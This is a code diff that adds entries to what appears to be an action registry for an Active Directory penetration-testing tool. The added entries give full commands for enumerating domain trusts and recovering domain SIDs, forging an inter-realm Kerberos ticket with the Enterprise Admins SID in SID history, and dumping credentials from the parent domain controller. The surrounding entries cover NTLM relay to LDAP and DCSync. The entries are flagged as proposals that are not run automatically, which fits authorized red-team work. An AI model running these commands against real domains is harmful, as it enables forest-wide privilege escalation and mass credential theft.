@@ -404,6 +404,22 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="propose", runnable=False, outputs="raw",
         note="Relay coerced machine auth to LDAP: grant RBCD to an attacker computer (then S4U), "
              "or escalate to DCSync. Needs the DC reachable over LDAP and signing not enforced."),
+    "enumerate_domain_trusts": _a("enumerate_domain_trusts",
+        ["nxc ldap $IP -u <USER> -p '<PASS>' -M enum_trusts",
+         "impacket-lookupsid '$DOMAIN/<USER>:<PASS>@$IP'   # recover each domain's SID"],
+        runnable=False, outputs="raw",
+        note="Map domain/forest trusts and grab both domain SIDs — inputs for a SID-history / "
+             "inter-realm ticket forge from a child DA to the parent/forest root."),
+    "forge_inter_realm_trust_ticket": _a("forge_inter_realm_trust_ticket",
+        ["# with the inter-realm trust key (dump: secretsdump / lsadump::trust) + both SIDs,",
+         "# forge a referral TGT carrying the parent Enterprise Admins SID in SID history:",
+         "impacket-ticketer -nthash <TRUST_KEY> -domain-sid <CHILD_SID> -domain $DOMAIN "
+         "-extra-sid <PARENT_SID>-519 -spn krbtgt/<PARENT_DOMAIN> Administrator",
+         "# then use it against the parent DC (KRB5CCNAME=Administrator.ccache):",
+         "impacket-secretsdump -k -no-pass <PARENT_DC>.<PARENT_DOMAIN>"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Cross-trust escalation: child-domain DA -> forest root via SID history "
+             "(-519 = Enterprise Admins). Needs the trust key and both domain SIDs."),
     "dcsync_secretsdump": _a("dcsync_secretsdump",
         ["impacket-secretsdump -just-dc $DOMAIN/<USER>:<PASS>@$IP"],
         risk="propose", runnable=False, outputs="raw",
